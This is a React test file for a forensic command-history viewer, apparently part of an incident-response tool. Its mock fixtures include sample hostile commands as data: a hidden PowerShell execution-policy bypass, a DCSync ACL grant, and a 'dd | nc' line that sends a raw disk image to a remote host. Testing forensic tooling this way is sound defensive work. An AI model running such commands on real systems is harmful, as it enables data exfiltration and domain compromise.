import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { MemoryRouter, Route, Routes, useLocation } from "react-router-dom";
import { beforeEach, describe, expect, it, vi } from "vitest";

import CommandHistoryPage from "./CommandHistoryPage";

const getCommandHistoryMock = vi.fn();
const markEventMock = vi.fn();
const writeTextMock = vi.fn();

vi.mock("../api/client", () => ({
  api: {
    getCommandHistory: (...args: unknown[]) => getCommandHistoryMock(...args),
    markEvent: (...args: unknown[]) => markEventMock(...args),
  },
}));

vi.mock("../context/ActiveCaseContext", () => ({
  useActiveCase: () => ({
    activeCaseId: "",
    activeCase: null,
    selectedHost: "HOSTA",
    selectedHostId: "",
    selectedEvidenceId: "ev-1",
    caseContext: { hosts: [] },
    setActiveCaseId: vi.fn(),
    setSelectedHost: vi.fn(),
    setSelectedHostId: vi.fn(),
    setSelectedEvidenceId: vi.fn(),
    clearSelectedHost: vi.fn(),
  }),
}));

vi.mock("../context/TimezoneContext", () => ({
  useTimezonePreference: () => ({
    effectiveTimezone: "UTC",
  }),
}));

function LocationProbe() {
  const location = useLocation();
  return <div data-testid="location">{`${location.pathname}${location.search}`}</div>;
}

function renderPage(path = "/cases/case-1/command-history?evidence_id=ev-1&host=HOSTA") {
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={queryClient}>
    <MemoryRouter initialEntries={[path]}>
      <Routes>
        <Route
          path="/cases/:caseId/command-history"
          element={
            <>
              <LocationProbe />
              <CommandHistoryPage />
            </>
          }
        />
        <Route path="/cases/:caseId/search" element={<LocationProbe />} />
        <Route path="/cases/:caseId/process-graph" element={<LocationProbe />} />
        <Route path="/cases/:caseId/w/execution/stories" element={<LocationProbe />} />
      </Routes>
    </MemoryRouter>
    </QueryClientProvider>,
  );
}

const response = {
  total: 125,
  page: 1,
  page_size: 100,
  sort: "timestamp_desc",
  sort_by: "timestamp",
  sort_order: "desc",
  items: [
    {
      id: "cmd-1",
      case_id: "case-1",
      evidence_id: "ev-1",
      host: "HOSTA",
      timestamp: "2024-03-22T12:00:00Z",
      timestamp_status: "forensic",
      command: "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\maintenance.ps1 -ArgumentList alpha,beta,gamma,delta,epsilon,zeta,eta,theta",
      command_normalized: "powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -file c:\\users\\public\\maintenance.ps1 -argumentlist alpha,beta,gamma,delta,epsilon,zeta,eta,theta",
      shell: "powershell",
      shell_family: "powershell",
      launcher: "powershell.exe",
      launcher_path: "powershell.exe",
      classification_confidence: "high",
      parent_shell: "",
      parent_context: "",
      source_type: "sysmon_1",
      source_event_id: "event-1",
      windows_event_id: "1",
      source_file: "Sysmon.evtx",
      user: "EXAMPLECORP\\usera",
      process: { name: "powershell.exe", executable: "powershell.exe", pid: 4444, guid: "{GUID-1}", command_line: "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\maintenance.ps1" },
      parent_process: { name: "explorer.exe", executable: "explorer.exe", pid: 2000, guid: null, command_line: "explorer.exe" },
      working_directory: "C:\\Users\\Public",
      risk_score: 75,
      risk_reasons: ["PowerShell execution policy bypass", "Synthetic indicator"],
      confidence: "high",
      dedupe_key: "key",
      raw_payload: "HostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\maintenance.ps1\nUser=EXAMPLECORP\\usera",
      supporting_events: [{ event_id: "event-1", source_type: "sysmon_1", windows_event_id: 1, timestamp: "2024-03-22T12:00:00Z", source_file: "Sysmon.evtx", artifact_type: "windows_event", parser: "evtxecmd_csv" }],
      linked_search_url: "/cases/case-1/search?event_id=event-1&evidence_id=ev-1&tab=results",
    },
  ],
  facets: {
    shell: { powershell: 1 },
    family: { powershell: 1 },
    launcher: { "powershell.exe": 1 },
    confidence: { high: 1 },
    source_type: { sysmon_1: 1 },
    user: { "EXAMPLECORP\\usera": 1 },
    host: { HOSTA: 1 },
    risk: { critical: 1 },
  },
  summary: {
    commands_total: 1,
    suspicious_total: 1,
    high_confidence: 1,
    with_command_line: 1,
    with_supporting_events: 0,
  },
};

describe("CommandHistoryPage", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    getCommandHistoryMock.mockResolvedValue(response);
    markEventMock.mockResolvedValue({ id: "mark-1", status: "suspicious" });
    writeTextMock.mockResolvedValue(undefined);
    Object.defineProperty(window.navigator, "clipboard", {
      configurable: true,
      value: { writeText: writeTextMock },
    });
  });

  it("renders command history rows in a fixed table with truncated command cells", async () => {
    renderPage();

    expect(await screen.findByText("Command History")).toBeInTheDocument();
    expect(screen.getByText(/powershell.exe -NoProfile/i)).toBeInTheDocument();
    expect(screen.getAllByText("powershell.exe").length).toBeGreaterThan(0);
    expect(screen.getByText(/Synthetic indicator/i)).toBeInTheDocument();
    expect(screen.getByTestId("command-history-table")).toHaveClass("table-fixed");
    expect(screen.getByTestId("command-cell")).toHaveStyle({ WebkitLineClamp: "3" });
    expect(getCommandHistoryMock).toHaveBeenCalledWith(
      "case-1",
      expect.objectContaining({ evidence_id: "ev-1", host: "HOSTA", page_size: 100 }),
    );
  });

  it("expands a command row, shows raw payload and copies the full command", async () => {
    const user = userEvent.setup();
    renderPage();

    await screen.findByText(/powershell.exe -NoProfile/i);
    await user.click(screen.getByRole("button", { name: "Details" }));

    expect(screen.getByText("Full command")).toBeInTheDocument();
    expect(screen.getByText("Raw payload")).toBeInTheDocument();
    expect(screen.getByText(/HostApplication=C:\\Windows/i)).toBeInTheDocument();

    fireEvent.click(screen.getByRole("button", { name: "Copy command" }));

    await waitFor(() => expect(screen.getAllByRole("button", { name: "Copied" }).length).toBeGreaterThan(0));
  });

  it("updates URL filters and can mark the source event suspicious", async () => {
    const user = userEvent.setup();
    renderPage();

    await screen.findByText(/powershell.exe -NoProfile/i);
    await user.clear(screen.getByPlaceholderText(/maintenance.ps1/i));
    await user.type(screen.getByPlaceholderText(/maintenance.ps1/i), "remote-admin");
    await user.click(screen.getByRole("button", { name: /^Apply$/i }));

    await waitFor(() => expect(screen.getByTestId("location")).toHaveTextContent("q=remote-admin"));

    await user.click(screen.getByRole("button", { name: "Details" }));
    await user.click(screen.getByRole("button", { name: /Mark suspicious/i }));
    await waitFor(() =>
      expect(markEventMock).toHaveBeenCalledWith(
        "event-1",
        expect.objectContaining({
          case_id: "case-1",
          evidence_id: "ev-1",
          status: "suspicious",
          labels: ["command-history"],
        }),
      ),
    );
  });

  it("opens process tree with PID, ProcessGuid, source event and timestamp context", async () => {
    const user = userEvent.setup();
    renderPage();

    await screen.findByText(/powershell.exe -NoProfile/i);
    await user.click(screen.getByRole("link", { name: /Open process tree/i }));

    await waitFor(() => expect(screen.getByTestId("location")).toHaveTextContent("/cases/case-1/w/execution/stories"));
    expect(screen.getByTestId("location")).toHaveTextContent("mode=execution_story");
    expect(screen.getByTestId("location")).toHaveTextContent("pid=4444");
    expect(screen.getByTestId("location")).toHaveTextContent("process_guid=%7BGUID-1%7D");
    expect(screen.getByTestId("location")).toHaveTextContent("source_event_id=event-1");
    expect(screen.getByTestId("location")).toHaveTextContent("story_event_id=event-1");
    expect(screen.getByTestId("location")).toHaveTextContent("origin=command_history");
    expect(screen.getByTestId("location")).toHaveTextContent("command_history_row_id=cmd-1");
    expect(screen.getByTestId("location")).toHaveTextContent("timestamp=2024-03-22T12%3A00%3A00Z");
  });

  it("toggles timestamp sorting and renders pagination above and below the table", async () => {
    const user = userEvent.setup();
    renderPage();

    await screen.findByText(/powershell.exe -NoProfile/i);
    expect(screen.getAllByRole("button", { name: /Next/i })).toHaveLength(2);
    expect(screen.getAllByText(/Page 1 of 2/i)).toHaveLength(2);

    await user.click(screen.getByRole("button", { name: /Sort timestamp ascending/i }));

    await waitFor(() => expect(screen.getByTestId("location")).toHaveTextContent("sort=timestamp_asc"));
    expect(screen.getByTestId("location")).toHaveTextContent("sort_by=timestamp");
    expect(screen.getByTestId("location")).toHaveTextContent("sort_order=asc");
  });

  it("shows the source-file line number as an ordering hint for undated PSReadLine commands", async () => {
    const psreadlineResponse = {
      ...response,
      total: 1,
      items: [
        {
          ...response.items[0],
          id: "psreadline-cmd-1",
          timestamp: null,
          timestamp_status: "missing",
          command: "Add-ObjectACL -PrincipalIdentity helpdesk -Rights DCSync",
          source_type: "psreadline",
          source_file: "C/Users/Administrator.MEGACORP/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
          line_number: 37,
        },
      ],
    };
    getCommandHistoryMock.mockResolvedValueOnce(psreadlineResponse);

    renderPage();

    expect(await screen.findByText("Add-ObjectACL -PrincipalIdentity helpdesk -Rights DCSync")).toBeInTheDocument();
    expect(screen.getByText("No timestamp")).toBeInTheDocument();
    expect(screen.getByText("line 37 in file")).toBeInTheDocument();
  });

  it("surfaces a truncation warning so an incomplete result set is never silent", async () => {
    getCommandHistoryMock.mockResolvedValueOnce({
      ...response,
      warnings: ["More than 5000 candidate command events matched; narrow by host, time range or search text to see the rest."],
    });

    renderPage();

    const warning = await screen.findByTestId("command-history-warning");
    expect(warning).toHaveTextContent(/More than 5000 candidate command events matched/i);
  });

  it("renders Linux shell history rows with artifact provenance in the existing table", async () => {
    const linuxResponse = {
      ...response,
      total: 1,
      items: [
        {
          id: "linux-cmd-1",
          case_id: "case-1",
          evidence_id: "ev-linux",
          artifact_id: "art-linux",
          host: "victoria",
          timestamp: null,
          timestamp_status: "missing",
          command: "dd if=/dev/sda1 | nc 192.168.56.1 4444",
          command_normalized: "dd if=/dev/sda1 | nc 192.168.56.1 4444",
          shell: "bash",
          shell_family: "linux_shell_history",
          launcher: "bash",
          launcher_path: "",
          classification_confidence: "medium",
          parent_shell: "",
          parent_context: "",
          source_type: "linux_shell_history",
          source_category: "Disk",
          source_plugin_or_parser: "linux_shell_raw",
          parser: "linux_shell_raw",
          artifact_type: "linux_shell_history",
          source_event_id: "linux-doc-1",
          windows_event_id: "",
          source_file: "volume-0/linux/root/.bash_history",
          user: "root",
          process: { name: null, executable: null, pid: null, guid: null, command_line: "dd if=/dev/sda1 | nc 192.168.56.1 4444" },
          parent_process: { name: null, executable: null, pid: null, guid: null, command_line: null },
          working_directory: null,
          risk_score: 0,
          risk_reasons: [],
          confidence: "low",
          dedupe_key: "case-1|linux_shell_history|linux-doc-1",
          raw_payload: "dd if=/dev/sda1 | nc 192.168.56.1 4444",
          supporting_events: [{ event_id: "linux-doc-1", source_type: "linux_shell_history", windows_event_id: "", timestamp: null, source_file: "volume-0/linux/root/.bash_history", artifact_id: "art-linux", artifact_type: "linux_shell_history", parser: "linux_shell_raw" }],
          linked_search_url: "/cases/case-1/search?event_id=linux-doc-1&evidence_id=ev-linux&tab=results",
        },
      ],
      facets: {
        shell: { linux_shell_history: 1 },
        family: { linux_shell_history: 1 },
        launcher: { bash: 1 },
        confidence: { medium: 1 },
        source_type: { linux_shell_history: 1 },
        user: { root: 1 },
        host: { victoria: 1 },
        risk: { none: 1 },
      },
      summary: { commands_total: 1, suspicious_total: 0, high_confidence: 0, with_command_line: 1, with_supporting_events: 0 },
    };
    getCommandHistoryMock.mockResolvedValueOnce(linuxResponse);
    const user = userEvent.setup();

    renderPage("/cases/case-1/command-history?family=linux_shell_history&host=HOSTA");

    expect(await screen.findByText("dd if=/dev/sda1 | nc 192.168.56.1 4444")).toBeInTheDocument();
    expect(screen.getAllByText("linux_shell_history").length).toBeGreaterThan(0);
    expect(screen.getByText("Disk: linux_shell_raw")).toBeInTheDocument();
    expect(screen.getByText("No timestamp")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Details" }));

    expect(screen.getByText("Artifact family:")).toBeInTheDocument();
    expect(screen.getByText("Parser:")).toBeInTheDocument();
    expect(screen.getByText("Artifact ID:")).toBeInTheDocument();
    expect(screen.getByText("art-linux")).toBeInTheDocument();
    expect(screen.getByText("volume-0/linux/root/.bash_history")).toBeInTheDocument();
  });
});
